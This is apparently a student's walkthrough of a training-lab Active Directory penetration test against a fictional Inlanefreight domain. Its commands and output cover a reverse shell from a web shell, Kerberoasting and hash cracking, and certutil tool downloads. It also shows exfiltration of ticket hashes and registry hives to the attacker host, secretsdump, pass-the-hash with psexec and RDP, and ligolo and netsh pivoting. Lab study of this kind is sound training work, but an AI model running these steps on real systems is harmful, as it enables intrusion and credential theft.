
# Brief

A team member started an External Penetration Test and was moved to another urgent project before they could finish. 

The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. 

As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. 

Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.


# Questions

1. Submit the contents of the flag.txt file on the administrator Desktop of the web server.

```sh
# Connect to the target
http://10.129.202.242/uploads/antak.aspx

# Enter the credentials
admin:My_W3bsH3ll_P@ssw0rd!


# I want a reverse shell. Start the listener on Pwnbox
sudo ncat -lvnp 443


# Go to revshells.com
IP: Pwnbox IP
Port: 443
Windows > Powershell #3(base64)
Shell: Powershell

# Copy and paste to webshell. If everything goes well, we should get a connection
sudo ncat -lvnp 443
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.60.29:49696.
whoami
nt authority\system

# Read the flag
type flag.txt

******
```


2. Kerberoast an account with the SPN `MSSQLSvc/SQL01.inlanefreight.local:1433` and submit the account name as your answer.

```powershell
# Enumerate SPNs with setspn. Works on both PS1 and cmd.exe. 
setspn.exe -Q */*

Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
	Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.INLANEFREIGHT.LOCAL
	ldap/DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
	ldap/DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL
	DNS/DC01.INLANEFREIGHT.LOCAL
	GC/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
	RestrictedKrbHost/DC01.INLANEFREIGHT.LOCAL
	RestrictedKrbHost/DC01
	RPC/03d2eace-bb3d-467e-a00a-eab0dbfaa065._msdcs.INLANEFREIGHT.LOCAL
	HOST/DC01/INLANEFREIGHT
	HOST/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT
	HOST/DC01
	HOST/DC01.INLANEFREIGHT.LOCAL
	HOST/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
	E3514235-4B06-11D1-AB04-00C04FC2DCD2/03d2eace-bb3d-467e-a00a-eab0dbfaa065/INLANEFREIGHT.LOCAL
	ldap/DC01/INLANEFREIGHT
	ldap/03d2eace-bb3d-467e-a00a-eab0dbfaa065._msdcs.INLANEFREIGHT.LOCAL
	ldap/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT
	ldap/DC01
	ldap/DC01.INLANEFREIGHT.LOCAL
	ldap/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	kadmin/changepw
CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/SQL01.inlanefreight.local:1433
CN=sqlprod,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/SQL02.inlanefreight.local:1433
CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
CN=sqltest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/DEVTEST.inlanefreight.local:1433
CN=sqlqa,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/QA001.inlanefreight.local:1433
CN=azureconnect,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	adfsconnect/azure01.inlanefreight.local
CN=backupjob,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	backupjob/veam001.inlanefreight.local
CN=WEB-WIN01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
	RestrictedKrbHost/WEB-WIN01
	HOST/WEB-WIN01
	RestrictedKrbHost/WEB-WIN01.INLANEFREIGHT.LOCAL
	HOST/WEB-WIN01.INLANEFREIGHT.LOCAL
CN=MS01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
	tapinego/MS01
	tapinego/MS01.INLANEFREIGHT.LOCAL
	TERMSRV/MS01
	TERMSRV/MS01.INLANEFREIGHT.LOCAL
	WSMAN/MS01
	WSMAN/MS01.INLANEFREIGHT.LOCAL
	RestrictedKrbHost/MS01
	HOST/MS01
	RestrictedKrbHost/MS01.INLANEFREIGHT.LOCAL
	HOST/MS01.INLANEFREIGHT.LOCAL

# Name
See output above
```


# Resuming on 05/11/2025

3. Crack the account's password. Submit the cleartext value.

```powershell
# So, we are kerberoasting. Start with powerview. Download on our Kali
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1


# Transfer to target
python3 -m http.server 8000


# On target
cd C:\Users\Public
certutil -urlcache -f http://10.10.14.196:8000/PowerView.ps1 PowerView.ps1

Import-module .\Powerview.ps1


# Verify
PS C:\Users\Public> get-module

ModuleType Version    Name                                ExportedCommands                                             
---------- -------    ----                                ----------------                                             
Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Con...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}    
Script     0.0        Powerview                                              

# Get SPNs
Get-DomainUser * -spn | select samaccountname

samaccountname
--------------
azureconnect  
backupjob     
krbtgt        
sqltest       
sqlqa         
sqldev        
svc_sql       
sqlprod       


# Retrieve the TGS tickets of svc_sql
Get-DomainUser -Identity ****** | Get-DomainSPNTicket -Format Hashcat


# I saved into a file because the output from the command above was ugly
Get-DomainUser -Identity ****** | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation


# copy hash to kali.
Get-Content ilfreight_tgs.csv

$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$B186707F...08CAAB


# Crack the hash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz 
hashcat -m 13100 svc_sql.hash /usr/share/wordlists/rockyou.txt --force -O



# But since I can, let me get all the TGS. Just in case
Get-DomainUser * | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_all.csv -NoTypeInformation


# Transfer to Pwnbox. On Pwnbox, download and start raven. I prefer this method for uploads
sudo apt install raven
raven -h # To confirm install was successful


# Start raven on port 80. If we don't add the port, default is 8080.
raven 10.10.14.196 80

[*] Serving HTTP on 10.10.14.196 port 80 (http://10.10.14.196:80/)
[*] Listener access is unrestricted
[*] Uploads will be saved in /home/htb-ac-487515/Documents


# On target, transfer the file
cd C:\Users\Public
Remove-item alias:curl 
curl -X POST http://10.10.14.196/ -F "files=@ilfreight_all.csv"

<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="refresh" content="3;url=/" charset="utf-8">
<title>Redirecting...</title>
</head>
<body>
<p>File uploaded successfully. Redirecting in 3 seconds...</p>
</body>
</html>


# Should see this on Pwnbox
raven 10.10.14.196 80
[*] Serving HTTP on 10.10.14.196 port 80 (http://10.10.14.196:80/)
[*] Listener access is unrestricted
[*] Uploads will be saved in /home/htb-ac-487515/Documents
10.129.60.29 - - [11/May/2025 08:47:50] "POST / HTTP/1.1" 200 -
10.129.60.29 - - [11/May/2025 08:47:50] "File saved /home/htb-ac-487515/Documents/ilfreight_all.csv"


# Verify
ls
ilfreight_all.csv  PowerView.ps1  ******.hash

head -n2 ilfreight_all.csv
"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
"azureconnect","CN=azureconnect,CN=Users,DC=INLANEFREIGHT,DC=LOCAL","adfsconnect/azure01.inlanefreight.local",,"$krb5tgs$23$*azureconnect$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$DD7741...7DD3"

# Nice and clean
```


4.  Submit the contents of the `flag.txt` file on the Administrator desktop on `MS01`

```sh
# Where are we currently?
PS C:\Users\Public> hostname
WEB-WIN01

# Situational awareness
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::7820:ab81:4793:8041%7
   IPv4 Address. . . . . . . . . . . : 172.16.6.100
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.6.1

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::1c3
   IPv6 Address. . . . . . . . . . . : dead:beef::8c27:1565:2703:dcd8
   Link-local IPv6 Address . . . . . : fe80::8c27:1565:2703:dcd8%3
   IPv4 Address. . . . . . . . . . . : 10.129.60.29
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb0:f91%3
                                       10.129.0.1


# What is the IP of MS01? Ping Sweep using powershell
1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.15.6.$($_) -quiet)"}


# Did not work. Let's ligolo this and make it easier. Download the required agent and proxy files
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.1/ligolo-ng_agent_0.8.1_windows_amd64.zip

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.1/ligolo-ng_proxy_0.8.1_linux_amd64.tar.gz


ls
ligolo-ng_agent_0.8.1_linux_amd64.tar.gz
ligolo-ng_agent_0.8.1_windows_amd64.zip


# Extract
sudo tar -xvzf ligolo-ng_proxy_0.8.1_linux_amd64.tar.gz 
LICENSE
README.md
proxy

rm LICENSE README.md 


# Since we are on Linux, create a new interface
whoami
htb-ac-487515

sudo ip tuntap add user htb-ac-487515 mode tun ligolo
sudo ip link set ligolo up


# Start the proxy
./proxy -selfcert

INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0000] Listening on 0.0.0.0:11601                   
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.1

ligolo-ng »  



# Open a new terminal
unzip ligolo-ng_agent_0.8.1_windows_amd64.zip 

Archive:  ligolo-ng_agent_0.8.1_windows_amd64.zip
  inflating: LICENSE                 
  inflating: README.md               
  inflating: agent.exe 

rm LICENSE README.md


# Stage for transfer to pivot host
python3 -m http.server 8000


# On target
certutil -urlcache -f http://10.10.14.196:8000/agent.exe agent.exe

****  Online  ****
CertUtil: -URLCache command completed successfully.


# Now connect back to our kali machine from target. # The IP will be the IP of our Kali VM/attacking machine. The -ignore-cert ignores certificate validation.  This means we won't have any issues with our self-signed certs.
.\agent.exe -connect 10.10.14.196:11601 -ignore-cert


# If everything worked well, we should see the following on our proxy terminal
ligolo-ng » INFO[0288] Agent joined.                                 id=005056b0a857 name="NT AUTHORITY\\SYSTEM@WEB-WIN01" remote="10.129.202.242:49775"
ligolo-ng » 


# Start a session
ligolo-ng » session
? Specify a session : 1 - NT AUTHORITY\SYSTEM@WEB-WIN01 - 10.129.202.242:49775 - 005056b0a857


# Get the IP to add the route to
[Agent : NT AUTHORITY\SYSTEM@WEB-WIN01] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet1                      │
│ Hardware MAC │ 00:50:56:b0:a8:57              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv6 Address │ fe80::800f:3d52:9ab6:7c07/64   │
│ IPv4 Address │ 172.16.6.100/16                │
└──────────────┴────────────────────────────────┘
┌──────────────────────────────────────────────────┐
│ Interface 1                                      │
├──────────────┬───────────────────────────────────┤
│ Name         │ Ethernet0                         │
│ Hardware MAC │ 00:50:56:b0:a7:55                 │
│ MTU          │ 1500                              │
│ Flags        │ up|broadcast|multicast|running    │
│ IPv6 Address │ dead:beef::238/128                │
│ IPv6 Address │ dead:beef::dd9b:4957:4c00:19dc/64 │
│ IPv6 Address │ fe80::dd9b:4957:4c00:19dc/64      │
│ IPv4 Address │ 10.129.202.242/16                 │
└──────────────┴───────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 2                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘
[Agent : NT AUTHORITY\SYSTEM@WEB-WIN01] »  


# Since we want to access the 172.16.6.0/24 network, open a new terminal and add the corresponding route to our ligolo-ng interface
sudo ip route add 172.16.6.0/24 dev ligolo

# Verify the route was added
ip route list

default via 95.111.212.1 dev ens3 
10.10.10.0/23 via 10.10.14.1 dev tun0 
10.10.14.0/23 dev tun0 proto kernel scope link src 10.10.14.196 
10.129.0.0/16 via 10.10.14.1 dev tun0 
95.111.212.0/22 dev ens3 proto kernel scope link src 95.111.214.194 
152.44.46.7 via 95.111.212.1 dev ens3 
159.65.208.199 via 95.111.212.1 dev ens3 
172.16.6.0/24 dev ligolo scope link linkdown 

# Start the tunnel
[Agent : NT AUTHORITY\SYSTEM@WEB-WIN01] » start
INFO[0591] Starting tunnel to NT AUTHORITY\SYSTEM@WEB-WIN01 (005056b0a857) 
[Agent : NT AUTHORITY\SYSTEM@WEB-WIN01] »  


# Once tunnel started, we can verify that the route is up. (Optional)
ip route list
default via 95.111.212.1 dev ens3 
10.10.10.0/23 via 10.10.14.1 dev tun0 
10.10.14.0/23 dev tun0 proto kernel scope link src 10.10.14.196 
10.129.0.0/16 via 10.10.14.1 dev tun0 
95.111.212.0/22 dev ens3 proto kernel scope link src 95.111.214.194 
152.44.46.7 via 95.111.212.1 dev ens3 
159.65.208.199 via 95.111.212.1 dev ens3 
172.16.6.0/24 dev ligolo scope link 


# And confonfirm we can ping the internal network
for i in {1..254} ;do (ping -c 1 172.16.6.$i | grep "bytes from" &) ;done


64 bytes from 172.16.6.3: icmp_seq=1 ttl=64 time=147 ms
64 bytes from 172.16.6.100: icmp_seq=1 ttl=64 time=97.8 ms


# We only have 2 hosts. 100 is us. So, we only have the DC left What services are running on the DC?
nmap -Pn -p- -v -sT 172.16.6.3

Nmap scan report for 172.16.6.3
Host is up (0.066s latency).
Not shown: 65511 filtered tcp ports (no-response)

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49684/tcp open  unknown
49696/tcp open  unknown
49719/tcp open  unknown


# Ok. I was wrong. Am I admin there?
crackmapexec smb 172.16.6.3 -u "Administrator" -p "******" --shares

SMB         172.16.6.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.6.3      445    DC01             [-] INLANEFREIGHT.LOCAL\Administrator:lucky7 STATUS_LOGON_FAILURE


# For F*CK sake!!! WHY AM I USING ADMINISTRATOR AS A USERNAME?
crackmapexec smb 172.16.6.3 -u "******" -p "******" --shares 

SMB         172.16.6.3      445    DC01             [*] Enumerated shares

Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 


# Nope. So these credentials are USELESS!!!Let's go back to WEB-WIN01. Stop the ligolo agent by pressing CTRL+C

# Since we are system, let's see if we can get the SAM and SYSTEM to get some low hanging credentials

reg.exe save hklm\sam sam.save
The operation completed successfully.

reg.exe save hklm\system system.save
The operation completed successfully.

reg.exe save hklm\security security.save
The operation completed successfully.


# Transfer to Kali
Remove-item alias:curl 
PS C:\Users\Public> curl -X POST http://10.10.14.196/ -F "files=@sam.save"

<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="refresh" content="3;url=/" charset="utf-8">
<title>Redirecting...</title>
</head>
<body>
<p>File uploaded successfully. Redirecting in 3 seconds...</p>
</body>
</html>

PS C:\Users\Public> curl -X POST http://10.10.14.196/ -F "files=@system.save"
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="refresh" content="3;url=/" charset="utf-8">
<title>Redirecting...</title>
</head>
<body>
<p>File uploaded successfully. Redirecting in 3 seconds...</p>
</body>
</html>


PS C:\Users\Public> curl -X POST http://10.10.14.196/ -F "files=@security.save"
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="refresh" content="3;url=/" charset="utf-8">
<title>Redirecting...</title>
</head>
<body>
<p>File uploaded successfully. Redirecting in 3 seconds...</p>
</body>
</html>


# Dump
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x908b8788f43a4425cb000861860970e3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245: (2022-04-12 02:44:23+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:6c2c29d1cb9d3e244de6bab3fc8e0195d5b1bc58057907042148a2aba63bc555fa6bc91938a0bfea20508e7cf66abc5474689b940e8bc532931350245b6abec877dfae8e6db81a599317e41b4da8a4b19ed34316821644e21029896b5ec445fa33abfb6d4254eb519588a145e87f483a6973ce6964a5f514a7dfb8d401806b0360c9164d39a55badc8ef0fcf85692c007973ef93411a8f9ad7b30ed59eab8e8dac912393b14c0c9e46c2c539155fb1caab6b21596319a95232ff87504e2b4813713fa2f1f2988c5743e558addc9581f05cb796e2ddc03fd0a5bdec64f81ce76fb750ff42bf1d307706d60042c5908217
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:71ef1afa180e279bd1dc2db6c9c78238
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x2b2dc77fd80b47be8ec5a3828de72d30b7314b2e
dpapi_userkey:0xb48b1806f8e0c5022b9cc0f92da0781ce6a24a60
[*] L$ASP.NETAutoGenKeysV44.0.30319.0 
...
L$ASP.NETAutoGenKeysV44.0.30319.0:efeaa4e4dbab5bba32b709d2915f3e150214e81e111b4b7b8ae1ab2dc59903ab416a38041381d2818993fc80e8f9a2f5123a077cd24b2c804e67596de99c1362df7c4a973a54d2d7f65a768ac1442f33660a4f686ad754322041854da4ddd6932d7ac4d796526af800a5e59c3d1c5833bc7fec6ddb3d5413f9cfe40b7b56fbe99809dd38a363f38248e9c0e6b3907c5555b37648300055a1f1658656e73890e2172c538114cd064adccfde4836680acc27fab898d07e509a551afc8eab82e88a58e3c3e562d6d36e393fc0e8be0b1a6e76f6cab28271dbc5f666e1c131e8588e66da01217ccb923fc08876bcf30c77e002c6009a538434fe1331f32529734ab2075fc3afa4e28c185453ce9d1681b4d1490ca2c1dea6975316c94541d7e41db9b3d913586ae4ab90358067ed874ac3eb9686c308f6f4392820f42095b56a4ed61db210bdfa620f4b0cfeed616b10e96a4faf17ac64aedd96b42e37ddfd6407eefe3ac42fd55128e1ec04d55cbec425b44498560eec8fab5ec2271f5767ea784804a29e7e7e545fe12cf8f03096b623116c7861907ba8b985537ca8ea117ee77f32f0d822d3d96a4f242509f2c232a4000c4108f51c0769ffc27c857a00005a1a76f6785a59238dff2875c67df54e337f5d7eee0efa23b08b7c87715d55daa4a17dab4992f810b8da8a01375a0dc2fc20f360871b96771a3a52654acd08f1ed9a3ae260c4a45ad301e1415115683a21b014700c659b066d82f4987a392e4eb1c91c9b689c2a5ef82f95f56d043836af8906a42d70b9ed3fe4a8b178fefcac4ee5659eceb742b5de0a19465f011241948081663c3178c7f7fc0ca53cb2aac7be8872a40ed88554e40235752e81770c86fd43ff9670346627e8f9f42a3971441596fd6e9edcd79b1bd385ca8406d63b1a61e963271d9872aa3d714910083aa1334241e6545e6d5d7699f4158d995ac5f32ddcaec64b651dbc8b9388f89d18f16b586dc28046c0eae5317fc1f0c694841796347940ea5d72384a5922a85e028b8d20ea08c54c1ad42cbc7cf9e62996b353f83c84341e0ab506c6624a81003245b37f89969ac9cd58d0d0c1130b6c6a769d4ba44db39da9b6bc3632e885ae95b5de532fa4e91ee9369aa05922ac9984a1bb3421dc2905b85615d78ab33f68ad94ef59427d035ca26a1c3c6a8dbaff8cc1e9ae6539f5af3a75dc08b4c07461abda5946e4fda741fb77daa64bb31287e83d5ff3c020422bffaf157177fb95ba360dd6e429d269775188d47bc271e0a542066d9b1f9870d9ddde21cd757cd665bdbfca1535aad5dcdaef1e96344a3604287770d58ec629e8de3887183d064b1040ac34bcc58c6a4c4610608c63ed064b2ad21df0d6c5d33504f0f34576205aba29cac77c9243c0cd72878a8987155c7f0c5f85263ef7820daf678a2ec03435cd7aa10663
[*] NL$KM 
...
NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
[*] Cleaning up... 


# So, I only have the admin hash. Can I crack?
vi admin.hash

cat admin.hash 
bdaffbfe64f1fc646a3353be1c2c3c99

sudo hashcat -m 1000 admin.hash /usr/share/wordlists/rockyou.txt --force -O

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: bdaffbfe64f1fc646a3353be1c2c3c99
Time.Started.....: Sun May 11 21:12:27 2025, (3 secs)
Time.Estimated...: Sun May 11 21:12:30 2025, (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
...



# Nope! Can I PtH?
impacket-psexec administrator@10.129.202.242 -hashes :bdaffbfe64f1fc646a3353be1c2c3c99

Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.202.242.....
[*] Found writable share ADMIN$
[*] Uploading file JVNLjJNA.exe
[*] Opening SVCManager on 10.129.202.242.....
[*] Creating service lylf on 10.129.202.242.....
[*] Starting service lylf.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 


# Can I RDP? Should I RDP? Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access. 
# Disable the DisableRestrictedAdmin registry key
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

The operation completed successfully.


# PtH with xfreerdp
xfreerdp /v:10.129.202.242 /u:Administrator /pth:bdaffbfe64f1fc646a3353be1c2c3c99

# Useless. I get the same command prompt as in the reverse shell. So, a server. With no GUI.

# Where is MS01? Ping from WIN01
Pinging MS01.INLANEFREIGHT.LOCAL [172.16.6.50] with 32 bytes of data:
Reply from 172.16.6.50: bytes=32 time=3ms TTL=128
Reply from 172.16.6.50: bytes=32 time<1ms TTL=128
Reply from 172.16.6.50: bytes=32 time<1ms TTL=128
Reply from 172.16.6.50: bytes=32 time<1ms TTL=128

Ping statistics for 172.16.6.50:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 3ms, Average = 0ms


# Why do I have the admin hash and the ****** credentials? How do I access 172.16.6.50? What do I have left? 

# Looking into the tunneling, it looks like all I can do is netsh.exe.  Anything other pivoting method I know won't work because I don't have the credentials. is port 3389 open on WIN01?
PS C:\Users\Public> Test-NetConnection -Port 3389 172.16.6.50


ComputerName     : 172.16.6.50
RemoteAddress    : 172.16.6.50
RemotePort       : 3389
InterfaceAlias   : Ethernet1
SourceAddress    : 172.16.6.100
TcpTestSucceeded : True


# Try the tunnel
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=ExternalIPWindowsPivot connectport=3389 connectaddress=InternalTargetIP

netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.202.242 connectport=3389 connectaddress=172.16.6.50

# Verify
PS C:\users\Public> netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.202.242  8080        172.16.6.50     3389


# Connect MS01 from our Pwnbox with the credentials found
xfreerdp /u:sql_svc /p:lucky7 /v:10.129.202.242:8080 /size:80% +clipboard 


# Failed. Try the admin?
xfreerdp /v:10.129.202.242:8080 /u:Administrator /pth:bdaffbfe64f1fc646a3353be1c2c3c99

# There's account restrictions that are preventing from signing in. We need to enable the registry key on that MS01 and I am not sure how to do that from WIN01.
```

# Resuming on 05/12/2025

```powershell
# Revert back to Ligolo. On a new day, I am now able to finally ping MS01 from Pwnbox.
ping 172.16.6.50 -c 1
PING 172.16.6.50 (172.16.6.50) 56(84) bytes of data.
64 bytes from 172.16.6.50: icmp_seq=1 ttl=64 time=141 ms

--- 172.16.6.50 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 141.335/141.335/141.335/0.000 ms


# Let's create a PSExec session?
impacket-psexec administrator@172.16.6.50 -hashes :bdaffbfe64f1fc646a3353be1c2c3c99


Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 172.16.6.50.....
[*] Found writable share ADMIN$
[*] Uploading file POcXNFzZ.exe
[*] Opening SVCManager on 172.16.6.50.....
[*] Creating service mLAy on 172.16.6.50.....
[*] Starting service mLAy.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname
MS01


# We are in!!!! Not sure why this didn't work yesterday. Check the flag?
C:\Users> cd Administrator\Desktop

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\Users\Administrator\Desktop

04/20/2022  05:25 AM    <DIR>          .
04/20/2022  05:25 AM    <DIR>          ..
04/11/2022  08:01 PM                29 flag.txt
               1 File(s)             29 bytes
               2 Dir(s)  18,933,985,280 bytes free

C:\Users\Administrator\Desktop> type flag.txt
******

# WHY DIDN'T YOU WORK YESTERDAY? WHY??????
```


5. Find cleartext credentials for another domain user. Submit the username as your answer.

```powershell
# Since we are system, let's just dump the SAM again. But before that, let's enable RDP. Disable the DisableRestrictedAdmin registry key
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

The operation completed successfully.


# Can we RDP as admin?
xfreerdp /v:172.16.6.50 /u:Administrator /pth:bdaffbfe64f1fc646a3353be1c2c3c99


# Yes. We have a session. Let's add a listener to upload files in ligolo
[Agent : NT AUTHORITY\SYSTEM@WEB-WIN01] » listener_add --addr 0.0.0.0:12345 --to 127.0.0.1:8000
INFO[0710] Listener 0 created on remote agent!  


# Save the sam and system of MS01 on administrator desktop
reg.exe save hklm\sam sam.save
The operation completed successfully.

reg.exe save hklm\system system.save
The operation completed successfully.

reg.exe save hklm\security security.save
The operation completed successfully.


# Transfer files to our Pwnbox. Start raven on port 8000
raven 10.10.14.196 8000


# On MS01, use the internal IP of our Pivot host
Remove-item alias:curl 
curl -X POST http://172.16.6.100:8000/ -F "files=@sam.save"

[Agent : NT AUTHORITY\SYSTEM@WEB-WIN01] » ERRO[1163] dial tcp 127.0.0.1:8000: connect: connection refused 
ERRO[1279] dial tcp 127.0.0.1:8000: connect: connection refused 
ERRO[1312] dial tcp 127.0.0.1:8000: connect: connection refused 
ERRO[1340] dial tcp 127.0.0.1:8000: connect: connection refused 


# Why is connection refused? Can I dump the secrets remotely? SAM
crackmapexec smb 172.16.6.50 --local-auth -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99 --sam

SMB         172.16.6.50     445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
